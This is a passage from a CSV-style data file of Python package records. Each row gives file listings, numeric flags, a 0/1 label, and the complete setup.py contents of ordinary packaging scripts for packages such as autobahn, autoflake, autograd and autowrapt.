compress_snappy.py interfaces.py protocol.py test_websocket_frame.py test_websocket_protocol.py test_websocket_url.py __init__.py types.py utf8validator.py util.py xormasker.py __init__.py enum.py.jinja2 module.py.jinja2 obj.py.jinja2 service.py.jinja2 test_enum.py.jinja2 test_module.py.jinja2 test_obj.py.jinja2 test_service.py.jinja2 obj-eip712.sol.jinja2 demo.bfbs testsvc1.bfbs wamp-auth.bfbs wamp-control.bfbs wamp-meta.bfbs wamp.bfbs config.ini default.priv default.pub test_xbr_argon2.py test_xbr_config.py test_xbr_eip712.py test_xbr_frealm.py test_xbr_mnemonic.py test_xbr_schema_demo.py test_xbr_schema_wamp.py test_xbr_schema_wamp_control.py test_xbr_secmod.py test_xbr_web3.py __init__.py _abi.py _blockchain.py _buyer.py _cli.py _config.py _dialog.py _eip712_api_publish.py _eip712_authority_certificate.py _eip712_base.py _eip712_catalog_create.py _eip712_certificate.py _eip712_certificate_chain.py _eip712_channel_close.py _eip712_channel_open.py _eip712_consent.py _eip712_delegate_certificate.py _eip712_domain_create.py _eip712_market_create.py _eip712_market_join.py _eip712_market_leave.py _eip712_market_member_login.py _eip712_member_login.py _eip712_member_register.py _eip712_member_unregister.py _eip712_node_pair.py _frealm.py _gui.py _interfaces.py _mnemonic.py _schema.py _secmod.py _seller.py _userkey.py _util.py _wallet.py __init__.py _version.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst requirements-dev.txt setup.cfg setup.py autobahn_endpoints.py autobahn_twistd.py,"###############################################################################
#
# The MIT License (MIT)
#
# Copyright (c) Crossbar.io Technologies GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the ""Software""), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
###############################################################################

import os
import sys
import shutil
import platform
from setuptools import setup
from setuptools.command.test import test as test_command

CPY = platform.python_implementation() == 'CPython'

# read version string
with open('autobahn/_version.py') as f:
    exec(f.read())  # defines __version__

# read package long description
with open('README.rst') as f:
    docstr = f.read()

# Twisted dependencies (be careful bumping these minimal versions,
# as we make claim to support older Twisted!)
extras_require_twisted = [
    ""zope.interface>=5.2.0"",        # Zope Public License
    ""twisted>=20.3.0"",              # MIT license (https://pypi.org/project/Twisted/20.3.0/)
    ""attrs>=20.3.0""                 # MIT license (https://pypi.org/project/attrs/19.2.0/)
]

# C-based WebSocket acceleration (only use on CPython, not PyPy!)
if CPY and sys.platform != 'win32':
    # wsaccel does not provide wheels: https://github.com/methane/wsaccel/issues/12
    extras_require_accelerate = [
        # ""wsaccel>=0.6.3""            # Apache 2.0
    ]
else:
    extras_require_accelerate = []

# non-standard WebSocket compression support (FIXME: consider removing altogether)
# Ubuntu: sudo apt-get install libsnappy-dev
extras_require_compress = [
    ""python-snappy>=0.6.0"",         # BSD license
]

# accelerated JSON and non-JSON WAMP serialization support (namely MessagePack, CBOR and UBJSON)
extras_require_serialization = []
if CPY:
    extras_require_serialization.extend([
        'msgpack>=1.0.2',           # Apache 2.0 license
        'ujson>=4.0.2',             # BSD license
    ])
else:
    os.environ['PYUBJSON_NO_EXTENSION'] = '1'  # enforce use of pure Python py-ubjson (no Cython)
    extras_require_serialization.extend([
        'u-msgpack-python>=2.1',    # MIT license
    ])

extras_require_serialization.extend([
    'cbor2>=5.2.0',             # MIT license
    'py-ubjson>=0.16.1',        # Apache 2.0 license
    'flatbuffers>=1.12',        # Apache 2.0 license
])

# TLS transport encryption
# WAMP-cryptosign end-to-end encryption
# WAMP-cryptosign authentication
os.environ['SODIUM_INSTALL'] = 'bundled'  # enforce use of bundled libsodium
extras_require_encryption = [
    'pyopenssl>=20.0.1',            # Apache 2.0 license
    'service_identity>=18.1.0',     # MIT license
    'pynacl>=1.4.0',                # Apache license
    'pytrie>=0.4.0',                # BSD license
    'qrcode>=7.3.1',                # BSD license
]

# Support for WAMP-SCRAM authentication
extras_require_scram = [
    'cffi>=1.14.5',             # MIT license
    'argon2_cffi>=20.1.0',      # MIT license
    'passlib>=1.7.4',           # BSD license
]

# Support native vector (SIMD) acceleration included with Autobahn
extras_require_nvx = [
    'cffi>=1.14.5',             # MIT license
]

# cffi based extension modules to build, currently only NVX
cffi_modules = []
if 'AUTOBAHN_USE_NVX' not in os.environ or os.environ['AUTOBAHN_USE_NVX'] not in ['0', 'false']:
    cffi_modules.append('autobahn/nvx/_utf8validator.py:ffi')

extras_require_xbr = [
    # XBR contracts and ABI file bundle
    'xbr>=21.2.1',              # Apache 2.0

    # CLI handling and color terminal output
    'click>=8.1.2',             # BSD license

    # the following is needed for XBR basics and XBR IDL code generation
    'cbor2>=5.2.0',             # MIT license
    'zlmdb>=21.2.1',            # MIT license
    'twisted>=20.3.0',          # MIT license
    'web3>=5.29.0',             # MIT license

    # the following is needed for EIP712 (""signed typed data""):
    'rlp>=2.0.1',               # MIT license
    'py-eth-sig-utils>=0.4.0',  # MIT license (https://github.com/rmeissner/py-eth-sig-utils)
    'py-ecc>=5.1.0',            # MIT license (https://github.com/ethereum/py_ecc)
    'eth-abi>=2.1.1',           # MIT license (https://github.com/ethereum/eth-abi)

    # the following is needed (at least) for BIP32/39 mnemonic processing
    'mnemonic>=0.19',           # MIT license (https://github.com/trezor/python-mnemonic)
    'base58>=2.1.0',            # MIT license (https://github.com/keis/base58)
    'ecdsa>=0.16.1',            # MIT license (https://github.com/warner/python-ecdsa)
    'py-multihash>=2.0.1',      # MIT license (https://github.com/multiformats/py-multihash / https://pypi.org/project/py-multihash/)

    # the following is needed for the WAMP/XBR IDL code generator
    'jinja2>=2.11.3',           # BSD license
    'yapf==0.29.0',             # Apache 2.0

    # the following is needed for XBR account synch and device pairing
    'spake2>=0.8',              # MIT license (https://github.com/warner/python-spake2/blob/master/LICENSE)
    'hkdf>=0.0.3',              # BSD 2-Clause ""Simplified"" License
]

# required for UI based tools, e.g. xbrnetwork-ui (autobahn.xbr._gui:_main)
extras_require_ui = [
    # the following is needed for the graphical XBR onboarding UI
    'PyGObject>=3.40.0',        # GNU Lesser General Public License v2 or later (LGPLv2+) (GNU LGPL)
]

# everything
extras_require_all = extras_require_twisted + extras_require_accelerate + extras_require_compress + \
                     extras_require_serialization + extras_require_encryption + extras_require_scram + \
                     extras_require_nvx + extras_require_xbr + extras_require_ui

packages = [
    'autobahn',
    'autobahn.test',
    'autobahn.wamp',
    'autobahn.wamp.gen',
    'autobahn.wamp.gen.wamp',
    'autobahn.wamp.gen.wamp.proto',
    'autobahn.wamp.test',
    'autobahn.websocket',
    'autobahn.websocket.test',
    'autobahn.rawsocket',
    'autobahn.rawsocket.test',
    'autobahn.asyncio',
    'autobahn.twisted',
    'autobahn.twisted.test',
    'autobahn.twisted.testing',
    'autobahn.nvx',
    'autobahn.nvx.test',
    'twisted.plugins',
]

xbr_packages = [
    'autobahn.xbr',
    'autobahn.xbr.test',
    'autobahn.asyncio.xbr',
    'autobahn.twisted.xbr',
]

package_data = {'autobahn.asyncio': ['./test/*']}

entry_points = {
    ""console_scripts"": [
        ""wamp = autobahn.__main__:_main"",
    ]
}

if 'AUTOBAHN_STRIP_XBR' in os.environ:
    # force regeneration of egg-info manifest for stripped install
    shutil.rmtree('autobahn.egg-info', ignore_errors=True)
else:
    extras_require_all += extras_require_xbr
    packages += xbr_packages
    package_data['xbr'] = [
        './xbr/templates/py-autobahn/*.py.jinja2',
        './xbr/templates/sol-eip712/*.sol.jinja2',
    ]
    entry_points['console_scripts'] += [""xbrnetwork = autobahn.xbr._cli:_main""]
    entry_points['console_scripts'] += [""xbrnetwork-ui = autobahn.xbr._gui:_main""]

# development dependencies
extras_require_dev = []
with open('requirements-dev.txt') as f:
    for line in f.read().splitlines():
        line = line.strip()
        if not line.startswith('#'):
            extras_require_dev.append(line)

# for testing by users with ""python setup.py test"" (not Tox, which we use)
test_requirements = [
    ""pytest>=2.8.6,<3.3.0"",             # MIT license
]


class PyTest(test_command):
    """"""
    pytest integration for setuptools.

    see:
      - http://pytest.org/latest/goodpractises.html#integration-with-setuptools-test-commands
      - https://github.com/pyca/cryptography/pull/678/files
    """"""

    def finalize_options(self):
        test_command.finalize_options(self)
        self.test_args = []
        self.test_suite = True

    def run_tests(self):
        # Import here because in module scope the eggs are not loaded.
        import pytest
        errno = pytest.main(self.test_args)
        sys.exit(errno)


setup(
    name='autobahn',
    version=__version__,  # noqa
    description='WebSocket client & server library, WAMP real-time framework',
    long_description=docstr,
    license='MIT License',
    author='Crossbar.io Technologies GmbH',
    url='http://crossbar.io/autobahn',
    project_urls={
        'Source': 'https://github.com/crossbario/autobahn-python',
    },
    platforms='Any',
    install_requires=[
        'txaio>=21.2.1',        # MIT license (https://github.com/crossbario/txaio)
        'cryptography>=3.4.6',  # BSD *or* Apache license (https://github.com/pyca/cryptography)
        'hyperlink>=21.0.0',    # MIT license (https://github.com/python-hyper/hyperlink)
        'setuptools',           # MIT license (https://github.com/pypa/setuptools)
    ],
    extras_require={
        'all': extras_require_all,
        'asyncio': [],  # backwards compatibility
        'twisted': extras_require_twisted,
        'accelerate': extras_require_accelerate,
        'compress': extras_require_compress,
        'serialization': extras_require_serialization,
        'encryption': extras_require_encryption,
        'scram': extras_require_scram,
        'nvx': extras_require_nvx,
        'dev': extras_require_dev,
        'xbr': extras_require_xbr,
        'ui': extras_require_ui,
    },
    tests_require=test_requirements,
    cmdclass={
        'test': PyTest
    },
    packages=packages,
    package_data=package_data,
    cffi_modules=cffi_modules,

    entry_points=entry_points,

    # this flag will make files from MANIFEST.in go into _source_ distributions only
    include_package_data=True,

    zip_safe=False,

    python_requires='>=3.7',

    # http://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[""License :: OSI Approved :: MIT License"",
                 ""Development Status :: 5 - Production/Stable"",
                 ""Environment :: No Input/Output (Daemon)"",
                 ""Framework :: Twisted"",
                 ""Intended Audience :: Developers"",
                 ""Operating System :: OS Independent"",
                 ""Programming Language :: Python"",
                 ""Programming Language :: Python :: 3"",
                 ""Programming Language :: Python :: 3.7"",
                 ""Programming Language :: Python :: 3.8"",
                 ""Programming Language :: Python :: 3.9"",
                 ""Programming Language :: Python :: 3.10"",
                 ""Programming Language :: Python :: Implementation :: CPython"",
                 ""Programming Language :: Python :: Implementation :: PyPy"",
                 ""Topic :: Internet"",
                 ""Topic :: Internet :: WWW/HTTP"",
                 ""Topic :: Communications"",
                 ""Topic :: System :: Distributed Computing"",
                 ""Topic :: Software Development :: Libraries"",
                 ""Topic :: Software Development :: Libraries :: Python Modules"",
                 ""Topic :: Software Development :: Object Brokering""],
    keywords='autobahn crossbar websocket realtime rfc6455 wamp rpc pubsub twisted asyncio xbr data-markets blockchain ethereum'
)


# regenerate Twisted plugin cache
try:
    from twisted.internet import reactor
    print(""Twisted found (default reactor is {0})"".format(reactor.__class__))
except ImportError:
    # the user doesn't have Twisted, so skip
    pass
else:
    # Make Twisted regenerate the dropin.cache, if possible. This is necessary
    # because in a site-wide install, dropin.cache cannot be rewritten by
    # normal users.
    try:
        from twisted.plugin import IPlugin, getPlugins
        list(getPlugins(IPlugin))
    except Exception as e:
        print(""Failed to update Twisted plugin cache: {0}"".format(e))
    else:
        print(""Twisted dropin.cache regenerated."")
",0
autocfg-0.0.8,0,1,1,1,1,0,1,0,annotate.py dataclasses.py type_check.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"import setuptools

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""autocfg"", # Replace with your own username
    version=""0.0.8"",
    author=""autocfg contributors"",
    author_email=""autocfg@example.com"",
    description=""Deep learning configuration"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://github.com/zhreshold/autocfg"",
    packages=setuptools.find_packages(),
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    python_requires='>=3.6',
    install_requires=[
        'pyyaml',
        'dataclasses;python_version<""3.7""',
    ],
    tests_require=[
        'pytest'
    ]
)
",1
autoclasstoc-1.5.1,0,1,1,1,0,0,1,0,.commitlintrc.js test_and_release.yml .gitignore .readthedocs.yml errors.py nodes.py plugin.py sections.py utils.py autoclasstoc.css __init__.py CHANGELOG.md .gitignore advanced_usage.rst basic_example.py basic_usage.rst conf.py collections.rst other_projects.rst pathlib.rst getting_help.rst index.rst Makefile requirements.txt python.rst rst.rst sphinx.rst example.py show_nodes.py autoclasstoc.css class.rst module.rst LICENSE.txt PKG-INFO pyproject.toml README.rst .coveragerc pytest.ini test_section.nt test_section.py test_utils.py,,1
autodocsumm-0.2.9,0,1,1,1,0,0,1,0,__init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"from setuptools import setup

setup()
",1
autoflake-1.4,0,1,1,0,0,0,1,0,AUTHORS.rst dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt autoflake.py LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_autoflake.py,"#!/usr/bin/env python

""""""Setup for autoflake.""""""

import ast

import setuptools


def version():
    """"""Return version string.""""""
    with open('autoflake.py') as input_file:
        for line in input_file:
            if line.startswith('__version__'):
                return ast.parse(line).body[0].value.s


with open('README.rst') as readme:
    setuptools.setup(
        name='autoflake',
        version=version(),
        description='Removes unused imports and unused variables',
        long_description=readme.read(),
        license='Expat License',
        author='Steven Myint',
        url='https://github.com/myint/autoflake',
        classifiers=['Environment :: Console',
                     'Intended Audience :: Developers',
                     'License :: OSI Approved :: MIT License',
                     'Programming Language :: Python :: 2.7',
                     'Programming Language :: Python :: 3',
                     'Topic :: Software Development :: Quality Assurance'],
        keywords='clean,fix,automatic,unused,import',
        py_modules=['autoflake'],
        entry_points={
            'console_scripts': ['autoflake = autoflake:main']},
        install_requires=['pyflakes>=1.1.0'],
        test_suite='test_autoflake')
",1
autogluon.core-0.5.2,0,1,1,0,1,0,1,0,PKG-INFO setup.cfg setup.py distill_utils.py __init__.py conformity_score.py temperature_scaling.py __init__.py constants.py cleaner.py label_cleaner.py __init__.py dataset.py constants.py exceptions.py executors.py ray_hpo.py ray_tune_constants.py ray_tune_scheduler.py ray_tune_scheduler_factory.py ray_tune_searcher_factory.py space_converter.py __init__.py abstract_learner.py __init__.py locks.py classification_metrics.py quantile_metrics.py softclass_metrics.py util.py __init__.py abstract_model.py abstract_nn_model.py model_trial.py _tags.py __init__.py bagged_ensemble_model.py fold_fitting_strategy.py ray_parallel_fold_fitting_strategy.py stacker_ensemble_model.py weighted_ensemble_model.py __init__.py ensemble_selection.py greedy_weighted_ensemble_model.py __init__.py _utils.py __init__.py pseudolabeling.py __init__.py resources_calculator.py __init__.py reporter.py scheduler_factory.py seq_scheduler.py __init__.py dummy_searcher.py exceptions.py local_grid_searcher.py local_random_searcher.py local_searcher.py searcher_factory.py __init__.py space.py base_task.py __init__.py __init__.py abstract_trainer.py utils.py __init__.py custom_process.py custom_queue.py decorators.py defaultdict.py default_arguments.py early_stopping.py exceptions.py feature_selection.py files.py __init__.py miscs.py nvutil.py plots.py __init__.py serialization.py sync_remote.py time.py try_import.py utils.py version_utils.py __init__.py version.py _setup_utils.py __init__.py __init__.py dependency_links.txt namespace_packages.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe,"#!/usr/bin/env python
###########################
# This code block is a HACK (!), but is necessary to avoid code duplication. Do NOT alter these lines.
import os
from setuptools import setup
import importlib.util
filepath = os.path.abspath(os.path.dirname(__file__))
filepath_import = os.path.join(filepath, '..', 'core', 'src', 'autogluon', 'core', '_setup_utils.py')
spec = importlib.util.spec_from_file_location(""ag_min_dependencies"", filepath_import)
ag = importlib.util.module_from_spec(spec)
# Identical to `from autogluon.core import _setup_utils as ag`, but works without `autogluon.core` being installed.
spec.loader.exec_module(ag)
###########################

version = ag.load_version_file()
version = ag.update_version(version)

submodule = 'core'
install_requires = [
    # version ranges added in ag.get_dependency_version_ranges()
    'numpy',
    'scipy',
    'scikit-learn',
    'pandas',
    'tqdm',

    'requests',
    'matplotlib',
    # dask and distributed==2021.12.0 will cause ray(1.7.0 - 1.9.0) to fail
    # error:
    # https://ci.gluon.ai/blue/organizations/jenkins/autogluon/detail/master/702/pipeline/16
    'dask>=2021.09.1,<=2021.11.2',
    'distributed>=2021.09.1, <=2021.11.2',
    'boto3',

    f'autogluon.common=={version}',
]

extras_require = {
    'ray': [
        ""ray>=1.13,<1.14"",
    ],
    'raytune': [
        'ray[tune]>=1.13,<1.14',
        'hyperopt>=0.2.7,<0.2.8',
        # 'GPy>=1.10.0,<1.11.0'  # TODO: Enable this once PBT/PB2 are supported by ray lightning
    ]
}

tests_require = [
    'pytest',
    # TODO(Re-enable ray_lightning once it released 0.3.0) 'ray_lightning>=0.2.0,<0.3.0'
]

all_requires = []

for extra_package in ['ray', 'raytune']:
    all_requires += extras_require[extra_package]
tests_require = list(set(tests_require))
all_requires = list(set(all_requires))
extras_require['tests'] = tests_require
extras_require['all'] = all_requires

install_requires = ag.get_dependency_version_ranges(install_requires)

if __name__ == '__main__':
    ag.create_version_file(version=version, submodule=submodule)
    setup_args = ag.default_setup_args(version=version, submodule=submodule)
    setup(
        install_requires=install_requires,
        extras_require=extras_require,
        **setup_args,
    )
",1
autograd-1.4,0,1,1,1,1,0,0,0,builtins.py core.py differential_operators.py extend.py fixed_points.py flatten.py optimizers.py tracers.py __init__.py fft.py linalg.py numpy_boxes.py numpy_jvps.py numpy_vjps.py numpy_vspaces.py numpy_wrapper.py random.py __init__.py integrate.py linalg.py misc.py signal.py special.py beta.py chi2.py dirichlet.py gamma.py multivariate_normal.py norm.py poisson.py t.py __init__.py __init__.py test_util.py tracer.py util.py wrap_util.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup

setup(
    name='autograd',
    version='1.4',
    description='Efficiently computes derivatives of numpy code.',
    author='Dougal Maclaurin and David Duvenaud and Matthew Johnson',
    author_email=""maclaurin@physics.harvard.edu, duvenaud@cs.toronto.edu, mattjj@csail.mit.edu"",
    packages=['autograd', 'autograd.numpy', 'autograd.scipy', 'autograd.scipy.stats', 'autograd.misc'],
    install_requires=['numpy>=1.12', 'future>=0.15.2'],
    keywords=['Automatic differentiation', 'backpropagation', 'gradients',
              'machine learning', 'optimization', 'neural networks',
              'Python', 'Numpy', 'Scipy'],
    url='https://github.com/HIPS/autograd',
    license='MIT',
    classifiers=['Development Status :: 4 - Beta',
                 'License :: OSI Approved :: MIT License',
                 'Programming Language :: Python :: 2.7',
                 'Programming Language :: Python :: 3.5'],
)
",1
autograd-gamma-0.5.0,0,1,1,1,1,0,1,0,__init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python

import setuptools

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""autograd-gamma"",
    version=""0.5.0"",
    description=""Autograd compatible approximations to the gamma family of functions"",
    license='MIT License',
    author=""Cameron Davidson-Pilon"",
    author_email=""cam.davidson.pilon@gmail.com"",
    url=""https://github.com/CamDavidsonPilon/autograd-gamma"",
    keywords=[""autograd"", ""gamma"", ""incomplete gamma function""],
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    classifiers=[
        ""Intended Audience :: Science/Research"",
        ""Topic :: Scientific/Engineering"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 3"",
    ],
    install_requires=[""autograd>=1.2.0"", ""scipy>=1.2.0""],
    packages=setuptools.find_packages(),
)
",1
Automat-20.2.0,0,1,1,1,1,0,0,0,.gitignore .travis.yml _core.py _discover.py _introspection.py _methodical.py test_core.py test_discover.py test_methodical.py test_trace.py test_visualize.py __init__.py _visualize.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt test_transitions.py about.rst api.rst conf.py debugging.rst automat_example.py io_coffee_example.py lightswitch.py turnstile_example.py index.rst make.bat Makefile visualize.rst mystate.machine.MyMachine._machine.dot.png LICENSE PKG-INFO README.md setup.cfg setup.py tox.ini,"""""""
Setup file for automat
""""""

from setuptools import setup, find_packages

try:
    from m2r import parse_from_file
    long_description = parse_from_file('README.md')
except(IOError, ImportError):
    print(""\n\n!!! m2r not found, long_description is bad, don't upload this to PyPI !!!\n\n"")
    import io
    long_description = io.open('README.md', encoding=""utf-8"").read()

setup(
    name='Automat',
    use_scm_version=True,
    url='https://github.com/glyph/Automat',
    description=""""""
    Self-service finite-state machines for the programmer on the go.
    """""".strip(),
    long_description=long_description,
    packages=find_packages(exclude=[]),
    package_dir={'automat': 'automat'},
    setup_requires=[
        'setuptools-scm',
        'm2r',
    ],
    install_requires=[
        ""attrs>=19.2.0"",
        ""six"",
    ],
    extras_require={
        ""visualize"": [""graphviz>0.5.1"",
                      ""Twisted>=16.1.1""],
    },
    entry_points={
        ""console_scripts"": [
            ""automat-visualize = automat._visualize:tool""
        ],
    },
    author='Glyph',
    author_email='glyph@twistedmatrix.com',
    include_package_data=True,
    license=""MIT"",
    keywords='fsm finite state machine automata',
    classifiers=[
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
)
",1
automaton-3.0.0,0,1,1,0,1,0,0,0,.coveragerc .pre-commit-config.yaml .stestr.conf .zuul.yaml AUTHORS pydot.py __init__.py exceptions.py machines.py runners.py test_fsm.py __init__.py _utils.py __init__.py dependency_links.txt not-zip-safe pbr.json PKG-INFO requires.txt SOURCES.txt top_level.txt bindep.txt ChangeLog CONTRIBUTING.rst requirements.txt conf.py index.rst index.rst index.rst index.rst examples.rst features.rst history.rst index.rst HACKING.rst LICENSE PKG-INFO README.rst .placeholder drop-python-2-7-73d3113c69d724d6.yaml conf.py index.rst ocata.rst pike.rst queens.rst rocky.rst stein.rst train.rst unreleased.rst ussuri.rst victoria.rst wallaby.rst xena.rst yoga.rst .placeholder .placeholder requirements.txt setup.cfg setup.py test-requirements.txt tox.ini,"# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import setuptools

setuptools.setup(
    setup_requires=['pbr>=2.0.0'],
    pbr=True)
",0
autopage-0.5.1,0,1,1,1,1,0,0,0,py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed py.typed argparse.py command.py py.typed isolation.py sinks.py test_argparse.py test_autopage.py test_command.py test_end_to_end.py test_line_buffer_from_input.py test_pager_settings.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg tox.ini,,1
autopep8-1.7.0,0,1,1,1,1,0,0,0,AUTHORS.rst dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt autopep8.py LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py bad_encoding.py bad_encoding2.py e101_example.py example.py example_with_reduce.py .pep8 tox.ini iso_8859_1.py test_autopep8.py test_suite.py __init__.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""Setup for autopep8.""""""

import ast
import io

from setuptools import setup


INSTALL_REQUIRES = (
    ['pycodestyle >= 2.9.1', 'toml']
)


def version():
    """"""Return version string.""""""
    with io.open('autopep8.py') as input_file:
        for line in input_file:
            if line.startswith('__version__'):
                return ast.parse(line).body[0].value.s


with io.open('README.rst') as readme:
    setup(
        name='autopep8',
        version=version(),
        description='A tool that automatically formats Python code to conform '
                    'to the PEP 8 style guide',
        long_description=readme.read(),
        license='Expat License',
        author='Hideo Hattori',
        author_email='hhatto.jp@gmail.com',
        url='https://github.com/hhatto/autopep8',
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Intended Audience :: Developers',
            'License :: OSI Approved :: MIT License',
            'Operating System :: OS Independent',
            'Programming Language :: Python',
            'Programming Language :: Python :: 2',
            'Programming Language :: Python :: 2.7',
            'Programming Language :: Python :: 3',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Programming Language :: Python :: 3.9',
            'Programming Language :: Python :: 3.10',
            'Topic :: Software Development :: Libraries :: Python Modules',
            'Topic :: Software Development :: Quality Assurance',
        ],
        keywords='automation, pep8, format, pycodestyle',
        install_requires=INSTALL_REQUIRES,
        test_suite='test.test_autopep8',
        py_modules=['autopep8'],
        zip_safe=False,
        entry_points={'console_scripts': ['autopep8 = autopep8:main']},
    )
",1
autoviz-0.1.43,0,1,1,0,1,0,1,0,AutoViz_Class.py AutoViz_Holo.py AutoViz_NLP.py AutoViz_Utils.py classify_method.py __init__.py __version__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"import setuptools

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""autoviz"",
    version=""0.1.43"",
    author=""Ram Seshadri"",
    # author_email=""author@example.com"",
    description=""Automatically Visualize any dataset, any size with a single line of code"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    license='Apache License 2.0',
    url=""https://github.com/AutoViML/AutoViz"",
    packages=setuptools.find_packages(exclude=(""tests"",)),
    install_requires=[
        ""ipython"",
        ""jupyter"",
        ""xlrd"",
        ""wordcloud"",
        ""emoji"",
        ""numpy"",
        ""pandas"",
        ""pyamg"",
        ""matplotlib>=3.3.3"",
        ""seaborn>=0.11.1"",
        ""scikit-learn"",
        ""statsmodels"",
        ""nltk"",
        ""textblob"",
        ""holoviews>=1.14.6"",
        ""bokeh>=2.4.2"",
        ""hvplot>=0.7.3"",
        ""panel~=0.12.6"",
        ""xgboost>=0.82"",
        ""fsspec>=0.8.3"",
        ""typing-extensions>=4.1.1"",
    ],
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Operating System :: OS Independent"",
    ],
)
",1
autowrapt-1.0,0,1,1,1,1,0,0,0,autowrapt-init.pth dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py bootstrap.py examples.py __init__.py,"import sys
import os

from setuptools import setup
from distutils.sysconfig import get_python_lib

setup_kwargs = dict(
    name = 'autowrapt',
    version = '1.0',
    description = 'Boostrap mechanism for monkey patches.',
    author = 'Graham Dumpleton',
    author_email = 'Graham.Dumpleton@gmail.com',
    license = 'BSD',
    url = 'https://github.com/GrahamDumpleton/autowrapt',
    packages = ['autowrapt'],
    package_dir = {'autowrapt': 'src'},
    data_files = [(get_python_lib(prefix=''), ['autowrapt-init.pth'])],
    entry_points = {'autowrapt.examples':
            ['this = autowrapt.examples:autowrapt_this']},
    install_requires = ['wrapt>=1.10.4'],
)

setup(**setup_kwargs)
",1
